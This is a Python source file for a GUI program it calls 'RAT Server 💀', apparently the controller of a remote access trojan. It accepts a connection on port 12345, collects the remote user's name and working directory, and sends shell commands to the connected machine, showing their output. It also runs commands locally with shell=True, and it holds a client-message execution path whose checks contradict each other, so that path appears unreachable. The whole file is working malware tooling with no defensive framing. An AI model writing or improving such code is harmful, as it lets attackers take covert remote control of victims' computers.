import customtkinter as ctk
import threading
import socket
from virtual_keyboard import NormalKeyboard
import subprocess

active_client = [None]  # Используем список как контейнер
port = 12345


def safe_textbox_insert(textbox, text):
    textbox.configure(state="normal")
    textbox.insert("end", text)
    textbox.yview("end")
    textbox.configure(state="disabled")

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def get_user_name(client_socket):
    user_name = ""
    data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
    user_name += data
    if "END_OF_USER_MSG" in user_name:  # Проверка на окончание сообщения
        user_name = user_name.replace("END_OF_USER_MSG", "").strip()
        return user_name
    return user_name

def get_current_directory(client_socket):
    current_dir = ""
    data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
    current_dir += data
    if "END_OF_DIR_MSG" in current_dir:  # Проверка на окончание сообщения
        current_dir = current_dir.replace("END_OF_DIR_MSG", "").strip()
        return current_dir
    return current_dir

def handle_client(client_socket, text_box):
    """Функция для общения с клиентом"""
    try:
        user_name = get_user_name(client_socket)
        safe_textbox_insert(text_box, f"Имя пользователя: {user_name}\n")
        
        current_dir = get_current_directory(client_socket)
        safe_textbox_insert(text_box, f"Текущая директория: {current_dir}\n")

        buffer = ""  # Буфер для накопления входящих данных

        while True:
            data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
            if not data:
                break

            buffer += data

            # Проверяем, завершено ли сообщение
            if not is_message_end(buffer):
                continue  # Ждём, пока не получим всё сообщение

            # Логируем полученное
            safe_textbox_insert(text_box, f"📥 Получено сообщение: {buffer}\n")

            if buffer.lower().strip() == "exit":
                break

            if not is_command(buffer):
                #safe_textbox_insert(text_box, f"📤 Не команда (пропущено): {buffer}\n")
                buffer = ""  # Очищаем буфер
                continue

            # Выполняем команду
            response = execute_command(buffer.replace("END_OF_MSG", "").strip())
            client_socket.send((response + "END_OF_MSG").encode(encoding="utf-8", errors="replace"))

            safe_textbox_insert(text_box, f"📤 Ответ от клиента: {response}\n")
            buffer = ""  # Сброс буфера после обработки

    except Exception as e:
        print(f"Ошибка: {e}")
    finally:
        client_socket.close()
    
def is_message_end(data):
    return (
        data.endswith("END_OF_USER_MSG") or 
        data.endswith("END_OF_DIR_MSG") or 
        data.endswith("END_OF_MSG")
    )


def is_command(data):
    return not is_message_end(data)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        return output
    except Exception as e:
        return f"❌ Ошибка выполнения команды: {e}"

def start_server_thread(server_socket, text_box, status_label):
    while True:
        try:
            client_socket, client_address = server_socket.accept()
            active_client[0] = client_socket
            status_label.configure(text="🟢 Connected", text_color="green")
            print(f"Клиент подключен: {client_address}")
            client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box))
            client_thread.daemon = True
            client_thread.start()
        except Exception as e:
            print(f"Ошибка подключения: {e}")
            safe_textbox_insert(text_box, f"❌ Ошибка подключения: {e}\n")
            status_label.configure(text="🔴 Error", text_color="red")
            break

def send_command_to_client(command_line, client_socket, text_box):
    """Отправка команды на клиент или выполнение локально, если не подключено"""
    command = command_line.get()
    if not command:
        return

    if client_socket:
        # Клиент подключён — отправляем команду
        safe_textbox_insert(text_box, f"📤 Отправлена команда: {command}\n")
        text_box.yview("end")
        try:
            client_socket.send(command.encode(encoding="utf-8", errors="replace"))
            response = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
            safe_textbox_insert(text_box, f"📥 Ответ от клиента: {response}\n")
        except Exception as e:
            safe_textbox_insert(text_box, f"❌ Ошибка отправки: {e}\n")
    else:
        # Клиент не подключён — выполняем локально
        safe_textbox_insert(text_box, f"⚙ Выполнение локально: {command}\n")
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            safe_textbox_insert(text_box, f"📥 Локальный вывод:\n{output}\n")
        except Exception as e:
            safe_textbox_insert(text_box, f"❌ Ошибка локального выполнения: {e}\n")
    command_line.delete(0, "end")
    text_box.yview("end")



def server(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)

    # Сокет и запуск сервера
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', port))
    server_socket.listen(1)

    # Основной контейнер с горизонтальным разделением (левая и правая части)
    main_frame = ctk.CTkFrame(parent_frame)
    main_frame.pack(fill="both", expand=True)

    # Левая часть (панель кнопок)
    left_frame = ctk.CTkFrame(main_frame, width=200)
    left_frame.pack(side="left", fill="y", padx=10, pady=10)

    # Правая часть (состоит из верхней и нижней)
    right_frame = ctk.CTkFrame(main_frame)
    right_frame.pack(side="left", fill="both", expand=True, padx=10, pady=10)

    # Верхняя часть правой панели (текстбокс и поле ввода)
    top_right_frame = ctk.CTkFrame(right_frame)
    top_right_frame.pack(side="top", fill="both", expand=True)

    # Нижняя часть правой панели (виртуальная клавиатура)
    bottom_right_frame = ctk.CTkFrame(right_frame, height=200)
    bottom_right_frame.pack(side="bottom", fill="x")

    # === Левая панель ===
    title = ctk.CTkLabel(left_frame, text="RAT Server 💀", font=ctk.CTkFont(weight="bold"))
    title.pack(pady=5)

    # Индикатор подключения
    status_label = ctk.CTkLabel(left_frame, text="🔴 Not connected", text_color="red")
    status_label.pack(pady=5)

    back_btn = ctk.CTkButton(left_frame, text="← Back", command=go_back_callback)
    back_btn.pack(pady=10)

    # === Правая верхняя панель ===
    command_line = ctk.CTkEntry(top_right_frame, placeholder_text="Enter command...")
    command_line.pack(fill="x", padx=5, pady=5)

    send_button = ctk.CTkButton(
        top_right_frame,
        text="📤 Отправить",
        command=lambda: send_command_to_client(command_line, active_client[0], text_box)
    )
    send_button.pack(padx=5, pady=5)

    text_box = ctk.CTkTextbox(top_right_frame)
    text_box.pack(fill="both", expand=True, padx=5, pady=5)

    # === Правая нижняя панель (клавиатура) ===
    keyboard = NormalKeyboard(bottom_right_frame, command_line)

    # === Кнопка для старта сервера ===
    def run_server():
        thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label))
        thread.daemon = True
        thread.start()

    start_server_btn = ctk.CTkButton(left_frame, text="🚀 Start Server", command=run_server)
    start_server_btn.pack(pady=10)

    # === Логирование в text_box ===
    safe_textbox_insert(text_box, f"listen on the port: {port}...\n")
    text_box.configure(state="disabled")
    text_box.pack(pady=10, fill="both", expand=True, padx=20)

    run_server()